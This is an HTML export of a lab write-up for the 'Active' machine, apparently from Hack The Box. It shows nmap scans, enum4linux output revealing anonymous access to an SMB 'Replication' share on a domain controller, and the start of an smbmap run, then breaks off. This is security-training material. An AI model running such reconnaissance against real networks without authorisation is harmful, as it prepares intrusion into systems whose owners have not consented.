@@ -1,0 +1,1259 @@
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>Active - 10.10.10.100</title><style>
+/* cspell:disable-file */
+/* webkit printing magic: print all background colors */
+html {
+	-webkit-print-color-adjust: exact;
+}
+* {
+	box-sizing: border-box;
+	-webkit-print-color-adjust: exact;
+}
+
+html,
+body {
+	margin: 0;
+	padding: 0;
+}
+@media only screen {
+	body {
+		margin: 2em auto;
+		max-width: 900px;
+		color: rgb(55, 53, 47);
+	}
+}
+
+body {
+	line-height: 1.5;
+	white-space: pre-wrap;
+}
+
+a,
+a.visited {
+	color: inherit;
+	text-decoration: underline;
+}
+
+.pdf-relative-link-path {
+	font-size: 80%;
+	color: #444;
+}
+
+h1,
+h2,
+h3 {
+	letter-spacing: -0.01em;
+	line-height: 1.2;
+	font-weight: 600;
+	margin-bottom: 0;
+}
+
+.page-title {
+	font-size: 2.5rem;
+	font-weight: 700;
+	margin-top: 0;
+	margin-bottom: 0.75em;
+}
+
+h1 {
+	font-size: 1.875rem;
+	margin-top: 1.875rem;
+}
+
+h2 {
+	font-size: 1.5rem;
+	margin-top: 1.5rem;
+}
+
+h3 {
+	font-size: 1.25rem;
+	margin-top: 1.25rem;
+}
+
+.source {
+	border: 1px solid #ddd;
+	border-radius: 3px;
+	padding: 1.5em;
+	word-break: break-all;
+}
+
+.callout {
+	border-radius: 3px;
+	padding: 1rem;
+}
+
+figure {
+	margin: 1.25em 0;
+	page-break-inside: avoid;
+}
+
+figcaption {
+	opacity: 0.5;
+	font-size: 85%;
+	margin-top: 0.5em;
+}
+
+mark {
+	background-color: transparent;
+}
+
+.indented {
+	padding-left: 1.5em;
+}
+
+hr {
+	background: transparent;
+	display: block;
+	width: 100%;
+	height: 1px;
+	visibility: visible;
+	border: none;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.09);
+}
+
+img {
+	max-width: 100%;
+}
+
+@media only print {
+	img {
+		max-height: 100vh;
+		object-fit: contain;
+	}
+}
+
+@page {
+	margin: 1in;
+}
+
+.collection-content {
+	font-size: 0.875rem;
+}
+
+.column-list {
+	display: flex;
+	justify-content: space-between;
+}
+
+.column {
+	padding: 0 1em;
+}
+
+.column:first-child {
+	padding-left: 0;
+}
+
+.column:last-child {
+	padding-right: 0;
+}
+
+.table_of_contents-item {
+	display: block;
+	font-size: 0.875rem;
+	line-height: 1.3;
+	padding: 0.125rem;
+}
+
+.table_of_contents-indent-1 {
+	margin-left: 1.5rem;
+}
+
+.table_of_contents-indent-2 {
+	margin-left: 3rem;
+}
+
+.table_of_contents-indent-3 {
+	margin-left: 4.5rem;
+}
+
+.table_of_contents-link {
+	text-decoration: none;
+	opacity: 0.7;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.18);
+}
+
+table,
+th,
+td {
+	border: 1px solid rgba(55, 53, 47, 0.09);
+	border-collapse: collapse;
+}
+
+table {
+	border-left: none;
+	border-right: none;
+}
+
+th,
+td {
+	font-weight: normal;
+	padding: 0.25em 0.5em;
+	line-height: 1.5;
+	min-height: 1.5em;
+	text-align: left;
+}
+
+th {
+	color: rgba(55, 53, 47, 0.6);
+}
+
+ol,
+ul {
+	margin: 0;
+	margin-block-start: 0.6em;
+	margin-block-end: 0.6em;
+}
+
+li > ol:first-child,
+li > ul:first-child {
+	margin-block-start: 0.6em;
+}
+
+ul > li {
+	list-style: disc;
+}
+
+ul.to-do-list {
+	padding-inline-start: 0;
+}
+
+ul.to-do-list > li {
+	list-style: none;
+}
+
+.to-do-children-checked {
+	text-decoration: line-through;
+	opacity: 0.375;
+}
+
+ul.toggle > li {
+	list-style: none;
+}
+
+ul {
+	padding-inline-start: 1.7em;
+}
+
+ul > li {
+	padding-left: 0.1em;
+}
+
+ol {
+	padding-inline-start: 1.6em;
+}
+
+ol > li {
+	padding-left: 0.2em;
+}
+
+.mono ol {
+	padding-inline-start: 2em;
+}
+
+.mono ol > li {
+	text-indent: -0.4em;
+}
+
+.toggle {
+	padding-inline-start: 0em;
+	list-style-type: none;
+}
+
+/* Indent toggle children */
+.toggle > li > details {
+	padding-left: 1.7em;
+}
+
+.toggle > li > details > summary {
+	margin-left: -1.1em;
+}
+
+.selected-value {
+	display: inline-block;
+	padding: 0 0.5em;
+	background: rgba(206, 205, 202, 0.5);
+	border-radius: 3px;
+	margin-right: 0.5em;
+	margin-top: 0.3em;
+	margin-bottom: 0.3em;
+	white-space: nowrap;
+}
+
+.collection-title {
+	display: inline-block;
+	margin-right: 1em;
+}
+
+.page-description {
+	margin-bottom: 2em;
+}
+
+.simple-table {
+	margin-top: 1em;
+	font-size: 0.875rem;
+	empty-cells: show;
+}
+.simple-table td {
+	height: 29px;
+	min-width: 120px;
+}
+
+.simple-table th {
+	height: 29px;
+	min-width: 120px;
+}
+
+.simple-table-header-color {
+	background: rgb(247, 246, 243);
+	color: black;
+}
+.simple-table-header {
+	font-weight: 500;
+}
+
+time {
+	opacity: 0.5;
+}
+
+.icon {
+	display: inline-block;
+	max-width: 1.2em;
+	max-height: 1.2em;
+	text-decoration: none;
+	vertical-align: text-bottom;
+	margin-right: 0.5em;
+}
+
+img.icon {
+	border-radius: 3px;
+}
+
+.user-icon {
+	width: 1.5em;
+	height: 1.5em;
+	border-radius: 100%;
+	margin-right: 0.5rem;
+}
+
+.user-icon-inner {
+	font-size: 0.8em;
+}
+
+.text-icon {
+	border: 1px solid #000;
+	text-align: center;
+}
+
+.page-cover-image {
+	display: block;
+	object-fit: cover;
+	width: 100%;
+	max-height: 30vh;
+}
+
+.page-header-icon {
+	font-size: 3rem;
+	margin-bottom: 1rem;
+}
+
+.page-header-icon-with-cover {
+	margin-top: -0.72em;
+	margin-left: 0.07em;
+}
+
+.page-header-icon img {
+	border-radius: 3px;
+}
+
+.link-to-page {
+	margin: 1em 0;
+	padding: 0;
+	border: none;
+	font-weight: 500;
+}
+
+p > .user {
+	opacity: 0.5;
+}
+
+td > .user,
+td > time {
+	white-space: nowrap;
+}
+
+input[type="checkbox"] {
+	transform: scale(1.5);
+	margin-right: 0.6em;
+	vertical-align: middle;
+}
+
+p {
+	margin-top: 0.5em;
+	margin-bottom: 0.5em;
+}
+
+.image {
+	border: none;
+	margin: 1.5em 0;
+	padding: 0;
+	border-radius: 0;
+	text-align: center;
+}
+
+.code,
+code {
+	background: rgba(135, 131, 120, 0.15);
+	border-radius: 3px;
+	padding: 0.2em 0.4em;
+	border-radius: 3px;
+	font-size: 85%;
+	tab-size: 2;
+}
+
+code {
+	color: #eb5757;
+}
+
+.code {
+	padding: 1.5em 1em;
+}
+
+.code-wrap {
+	white-space: pre-wrap;
+	word-break: break-all;
+}
+
+.code > code {
+	background: none;
+	padding: 0;
+	font-size: 100%;
+	color: inherit;
+}
+
+blockquote {
+	font-size: 1.25em;
+	margin: 1em 0;
+	padding-left: 1em;
+	border-left: 3px solid rgb(55, 53, 47);
+}
+
+.bookmark {
+	text-decoration: none;
+	max-height: 8em;
+	padding: 0;
+	display: flex;
+	width: 100%;
+	align-items: stretch;
+}
+
+.bookmark-title {
+	font-size: 0.85em;
+	overflow: hidden;
+	text-overflow: ellipsis;
+	height: 1.75em;
+	white-space: nowrap;
+}
+
+.bookmark-text {
+	display: flex;
+	flex-direction: column;
+}
+
+.bookmark-info {
+	flex: 4 1 180px;
+	padding: 12px 14px 14px;
+	display: flex;
+	flex-direction: column;
+	justify-content: space-between;
+}
+
+.bookmark-image {
+	width: 33%;
+	flex: 1 1 180px;
+	display: block;
+	position: relative;
+	object-fit: cover;
+	border-radius: 1px;
+}
+
+.bookmark-description {
+	color: rgba(55, 53, 47, 0.6);
+	font-size: 0.75em;
+	overflow: hidden;
+	max-height: 4.5em;
+	word-break: break-word;
+}
+
+.bookmark-href {
+	font-size: 0.75em;
+	margin-top: 0.25em;
+}
+
+.sans { font-family: ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol"; }
+.code { font-family: "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace; }
+.serif { font-family: Lyon-Text, Georgia, ui-serif, serif; }
+.mono { font-family: iawriter-mono, Nitti, Menlo, Courier, monospace; }
+.pdf .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK JP'; }
+.pdf:lang(zh-CN) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK SC'; }
+.pdf:lang(zh-TW) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK TC'; }
+.pdf:lang(ko-KR) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK KR'; }
+.pdf .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+.pdf:lang(zh-CN) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+.pdf:lang(zh-TW) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+.pdf:lang(ko-KR) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+.pdf .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK JP'; }
+.pdf:lang(zh-CN) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK SC'; }
+.pdf:lang(zh-TW) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK TC'; }
+.pdf:lang(ko-KR) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK KR'; }
+.pdf .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+.pdf:lang(zh-CN) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+.pdf:lang(zh-TW) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+.pdf:lang(ko-KR) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+.highlight-default {
+	color: rgba(55, 53, 47, 1);
+}
+.highlight-gray {
+	color: rgba(120, 119, 116, 1);
+	fill: rgba(120, 119, 116, 1);
+}
+.highlight-brown {
+	color: rgba(159, 107, 83, 1);
+	fill: rgba(159, 107, 83, 1);
+}
+.highlight-orange {
+	color: rgba(217, 115, 13, 1);
+	fill: rgba(217, 115, 13, 1);
+}
+.highlight-yellow {
+	color: rgba(203, 145, 47, 1);
+	fill: rgba(203, 145, 47, 1);
+}
+.highlight-teal {
+	color: rgba(68, 131, 97, 1);
+	fill: rgba(68, 131, 97, 1);
+}
+.highlight-blue {
+	color: rgba(51, 126, 169, 1);
+	fill: rgba(51, 126, 169, 1);
+}
+.highlight-purple {
+	color: rgba(144, 101, 176, 1);
+	fill: rgba(144, 101, 176, 1);
+}
+.highlight-pink {
+	color: rgba(193, 76, 138, 1);
+	fill: rgba(193, 76, 138, 1);
+}
+.highlight-red {
+	color: rgba(212, 76, 71, 1);
+	fill: rgba(212, 76, 71, 1);
+}
+.highlight-default_background {
+	color: rgba(55, 53, 47, 1);
+}
+.highlight-gray_background {
+	background: rgba(241, 241, 239, 1);
+}
+.highlight-brown_background {
+	background: rgba(244, 238, 238, 1);
+}
+.highlight-orange_background {
+	background: rgba(251, 236, 221, 1);
+}
+.highlight-yellow_background {
+	background: rgba(251, 243, 219, 1);
+}
+.highlight-teal_background {
+	background: rgba(237, 243, 236, 1);
+}
+.highlight-blue_background {
+	background: rgba(231, 243, 248, 1);
+}
+.highlight-purple_background {
+	background: rgba(244, 240, 247, 0.8);
+}
+.highlight-pink_background {
+	background: rgba(249, 238, 243, 0.8);
+}
+.highlight-red_background {
+	background: rgba(253, 235, 236, 1);
+}
+.block-color-default {
+	color: inherit;
+	fill: inherit;
+}
+.block-color-gray {
+	color: rgba(120, 119, 116, 1);
+	fill: rgba(120, 119, 116, 1);
+}
+.block-color-brown {
+	color: rgba(159, 107, 83, 1);
+	fill: rgba(159, 107, 83, 1);
+}
+.block-color-orange {
+	color: rgba(217, 115, 13, 1);
+	fill: rgba(217, 115, 13, 1);
+}
+.block-color-yellow {
+	color: rgba(203, 145, 47, 1);
+	fill: rgba(203, 145, 47, 1);
+}
+.block-color-teal {
+	color: rgba(68, 131, 97, 1);
+	fill: rgba(68, 131, 97, 1);
+}
+.block-color-blue {
+	color: rgba(51, 126, 169, 1);
+	fill: rgba(51, 126, 169, 1);
+}
+.block-color-purple {
+	color: rgba(144, 101, 176, 1);
+	fill: rgba(144, 101, 176, 1);
+}
+.block-color-pink {
+	color: rgba(193, 76, 138, 1);
+	fill: rgba(193, 76, 138, 1);
+}
+.block-color-red {
+	color: rgba(212, 76, 71, 1);
+	fill: rgba(212, 76, 71, 1);
+}
+.block-color-default_background {
+	color: inherit;
+	fill: inherit;
+}
+.block-color-gray_background {
+	background: rgba(241, 241, 239, 1);
+}
+.block-color-brown_background {
+	background: rgba(244, 238, 238, 1);
+}
+.block-color-orange_background {
+	background: rgba(251, 236, 221, 1);
+}
+.block-color-yellow_background {
+	background: rgba(251, 243, 219, 1);
+}
+.block-color-teal_background {
+	background: rgba(237, 243, 236, 1);
+}
+.block-color-blue_background {
+	background: rgba(231, 243, 248, 1);
+}
+.block-color-purple_background {
+	background: rgba(244, 240, 247, 0.8);
+}
+.block-color-pink_background {
+	background: rgba(249, 238, 243, 0.8);
+}
+.block-color-red_background {
+	background: rgba(253, 235, 236, 1);
+}
+.select-value-color-uiBlue { background-color: rgba(35, 131, 226, .07); }
+.select-value-color-pink { background-color: rgba(245, 224, 233, 1); }
+.select-value-color-purple { background-color: rgba(232, 222, 238, 1); }
+.select-value-color-green { background-color: rgba(219, 237, 219, 1); }
+.select-value-color-gray { background-color: rgba(227, 226, 224, 1); }
+.select-value-color-transparentGray { background-color: rgba(227, 226, 224, 0); }
+.select-value-color-translucentGray { background-color: rgba(0, 0, 0, 0.06); }
+.select-value-color-orange { background-color: rgba(250, 222, 201, 1); }
+.select-value-color-brown { background-color: rgba(238, 224, 218, 1); }
+.select-value-color-red { background-color: rgba(255, 226, 221, 1); }
+.select-value-color-yellow { background-color: rgba(253, 236, 200, 1); }
+.select-value-color-blue { background-color: rgba(211, 229, 239, 1); }
+.select-value-color-pageGlass { background-color: undefined; }
+.select-value-color-washGlass { background-color: undefined; }
+
+.checkbox {
+	display: inline-flex;
+	vertical-align: text-bottom;
+	width: 16;
+	height: 16;
+	background-size: 16px;
+	margin-left: 2px;
+	margin-right: 5px;
+}
+
+.checkbox-on {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20width%3D%2216%22%20height%3D%2216%22%20fill%3D%22%2358A9D7%22%2F%3E%0A%3Cpath%20d%3D%22M6.71429%2012.2852L14%204.9995L12.7143%203.71436L6.71429%209.71378L3.28571%206.2831L2%207.57092L6.71429%2012.2852Z%22%20fill%3D%22white%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+
+.checkbox-off {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20x%3D%220.75%22%20y%3D%220.75%22%20width%3D%2214.5%22%20height%3D%2214.5%22%20fill%3D%22white%22%20stroke%3D%22%2336352F%22%20stroke-width%3D%221.5%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+	
+</style></head><body><article id="174d1b9f-8847-808e-b9a5-c509a0bd68cd" class="page sans"><header><h1 class="page-title"><strong>Active - 10.10.10.100</strong></h1><p class="page-description"></p></header><div class="page-body"><h1 id="2743ff58-4f1c-4aad-a9fc-1b988ac1ac70" class="">Information Gathering &amp; Enumeration</h1><h2 id="2ddbdb31-32b4-42cc-b44f-698076103312" class="">NMAP</h2><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="a36bdcfa-f8ac-40ae-95ad-beb4de6c89a7" class="code"><code class="language-Shell" style="white-space:pre-wrap;word-break:break-all">┌──(drroot㉿drroot)-[~/Desktop/.htb]
+└─$ sudo nmap -sS -p- --min-rate=5000 -T5 -n 10.10.10.100
+[sudo] password for drroot: 
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-06 20:46 -05
+Warning: 10.10.10.100 giving up on port because retransmission cap hit (2).
+Nmap scan report for 10.10.10.100
+Host is up (0.10s latency).
+Not shown: 65512 closed tcp ports (reset)
+PORT      STATE SERVICE
+53/tcp    open  domain
+88/tcp    open  kerberos-sec
+135/tcp   open  msrpc
+139/tcp   open  netbios-ssn
+389/tcp   open  ldap
+445/tcp   open  microsoft-ds
+464/tcp   open  kpasswd5
+593/tcp   open  http-rpc-epmap
+636/tcp   open  ldapssl
+3268/tcp  open  globalcatLDAP
+3269/tcp  open  globalcatLDAPssl
+5722/tcp  open  msdfsr
+9389/tcp  open  adws
+47001/tcp open  winrm
+49152/tcp open  unknown
+49153/tcp open  unknown
+49154/tcp open  unknown
+49155/tcp open  unknown
+49157/tcp open  unknown
+49158/tcp open  unknown
+49165/tcp open  unknown
+49172/tcp open  unknown
+49173/tcp open  unknown
+
+Nmap done: 1 IP address (1 host up) scanned in 14.69 seconds
+</code></pre><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="e7dfb666-8304-432c-9fe5-60b9fed1169e" class="code"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">┌──(drroot㉿drroot)-[~/Desktop/.htb]
+└─$ nmap -sVC -T5 -n 10.10.10.100 -p53,88,135,139,389,445,464,593,636,3268,3269,5722,9389,47001,49152,49153,49154,49155,49157,49158,49165,49172,49173
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-06 20:47 -05
+Nmap scan report for 10.10.10.100
+Host is up (0.10s latency).
+
+PORT      STATE SERVICE       VERSION
+53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
+| dns-nsid: 
+|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
+88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-01-07 01:47:50Z)
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
+445/tcp   open  microsoft-ds?
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  tcpwrapped
+3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
+3269/tcp  open  tcpwrapped
+5722/tcp  open  msrpc         Microsoft Windows RPC
+9389/tcp  open  mc-nmf        .NET Message Framing
+47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+49152/tcp open  msrpc         Microsoft Windows RPC
+49153/tcp open  msrpc         Microsoft Windows RPC
+49154/tcp open  msrpc         Microsoft Windows RPC
+49155/tcp open  msrpc         Microsoft Windows RPC
+49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+49158/tcp open  msrpc         Microsoft Windows RPC
+49165/tcp open  msrpc         Microsoft Windows RPC
+49172/tcp open  msrpc         Microsoft Windows RPC
+49173/tcp open  msrpc         Microsoft Windows RPC
+Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-time: 
+|   date: 2025-01-07T01:48:45
+|_  start_date: 2025-01-07T01:40:55
+|_clock-skew: -1s
+| smb2-security-mode: 
+|   2:1:0: 
+|_    Message signing enabled and required
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 72.59 seconds
+</code></pre><h2 id="174d1b9f-8847-8099-a8da-ddd033fcf3c7" class="">SMB Enumeration</h2><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="174d1b9f-8847-8093-a811-fe769290e7e4" class="code"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">──(drroot㉿drroot)-[~/Desktop/.htb]
+└─$ enum4linux -a 10.10.10.100                 
+Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Mon Jan  6 20:54:27 2025
+
+ =========================================( Target Information )=========================================
+
+Target ........... 10.10.10.100
+RID Range ........ 500-550,1000-1050
+Username ......... &#x27;&#x27;
+Password ......... &#x27;&#x27;
+Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none
+
+
+ ============================( Enumerating Workgroup/Domain on 10.10.10.100 )============================
+
+
+[E] Can&#x27;t find workgroup/domain
+
+
+
+ ================================( Nbtstat Information for 10.10.10.100 )================================
+
+Looking up status of 10.10.10.100
+No reply from 10.10.10.100
+
+ ===================================( Session Check on 10.10.10.100 )===================================
+
+
+[+] Server 10.10.10.100 allows sessions using username &#x27;&#x27;, password &#x27;&#x27;
+
+
+ ================================( Getting domain SID for 10.10.10.100 )================================
+
+do_cmd: Could not initialise lsarpc. Error was NT_STATUS_ACCESS_DENIED
+
+[+] Can&#x27;t determine if host is part of domain or part of a workgroup
+
+
+ ===================================( OS information on 10.10.10.100 )===================================
+
+
+[E] Can&#x27;t get OS info with smbclient
+
+
+[+] Got OS info for 10.10.10.100 from srvinfo: 
+	10.10.10.100   Wk Sv PDC Tim NT     Domain Controller
+	platform_id     :	500
+	os version      :	6.1
+	server type     :	0x80102b
+
+
+ =======================================( Users on 10.10.10.100 )=======================================
+
+
+[E] Couldn&#x27;t find users using querydispinfo: NT_STATUS_ACCESS_DENIED
+
+
+
+[E] Couldn&#x27;t find users using enumdomusers: NT_STATUS_ACCESS_DENIED
+
+
+ =================================( Share Enumeration on 10.10.10.100 )=================================
+
+do_connect: Connection to 10.10.10.100 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
+
+	Sharename       Type      Comment
+	---------       ----      -------
+	ADMIN$          Disk      Remote Admin
+	C$              Disk      Default share
+	IPC$            IPC       Remote IPC
+	NETLOGON        Disk      Logon server share 
+	Replication     Disk      
+	SYSVOL          Disk      Logon server share 
+	Users           Disk      
+Reconnecting with SMB1 for workgroup listing.
+Unable to connect with SMB1 -- no workgroup available
+
+[+] Attempting to map shares on 10.10.10.100
+
+//10.10.10.100/ADMIN$	Mapping: DENIED Listing: N/A Writing: N/A
+//10.10.10.100/C$	Mapping: DENIED Listing: N/A Writing: N/A
+//10.10.10.100/IPC$	Mapping: OK Listing: DENIED Writing: N/A
+//10.10.10.100/NETLOGON	Mapping: DENIED Listing: N/A Writing: N/A
+//10.10.10.100/Replication	Mapping: OK Listing: OK Writing: N/A
+//10.10.10.100/SYSVOL	Mapping: DENIED Listing: N/A Writing: N/A
+//10.10.10.100/Users	Mapping: DENIED Listing: N/A Writing: N/A
+
+ ============================( Password Policy Information for 10.10.10.100 )============================
+
+
+[E] Unexpected error from polenum:
+
+
+
+[+] Attaching to 10.10.10.100 using a NULL share
+
+[+] Trying protocol 139/SMB...
+
+	[!] Protocol failed: Cannot request session (Called Name:10.10.10.100)
+
+[+] Trying protocol 445/SMB...
+
+	[!] Protocol failed: SMB SessionError: code: 0xc0000022 - STATUS_ACCESS_DENIED - {Access Denied} A process has requested access to an object but has not been granted those access rights.
+
+
+
+[E] Failed to get password policy with rpcclient
+
+
+
+ =======================================( Groups on 10.10.10.100 )=======================================
+
+
+[+] Getting builtin groups:
+
+
+[+]  Getting builtin group memberships:
+
+
+[+]  Getting local groups:
+
+
+[+]  Getting local group memberships:
+
+
+[+]  Getting domain groups:
+
+
+[+]  Getting domain group memberships:
+
+
+ ==================( Users on 10.10.10.100 via RID cycling (RIDS: 500-550,1000-1050) )==================
+
+
+[E] Couldn&#x27;t get SID: NT_STATUS_ACCESS_DENIED.  RID cycling not possible.
+
+
+ ===============================( Getting printer info for 10.10.10.100 )===============================
+
+do_cmd: Could not initialise spoolss. Error was NT_STATUS_ACCESS_DENIED
+
+
+enum4linux complete on Mon Jan  6 20:55:11 2025
+
+</code></pre><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="174d1b9f-8847-8079-b710-de42efb1309e" class="code"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">┌──(drroot㉿drroot)-[~/Desktop/.htb]
+└─$ smbmap -H 10.10.10.100 
+    ________  ___      ___  _______   ___      ___       __         _______
+   /&quot;       )|&quot;  \    /&quot;  ||   _  &quot;\ |&quot;  \    /&quot;  |     /&quot;&quot;\       |   __ &quot;\
+  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
+   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /&#x27; /\  \     |:  ____/
+    __/  \   |: \.        |(|  _  \  |: \.        |  //  __&#x27;  \    (|  /
+   /&quot; \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
+  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
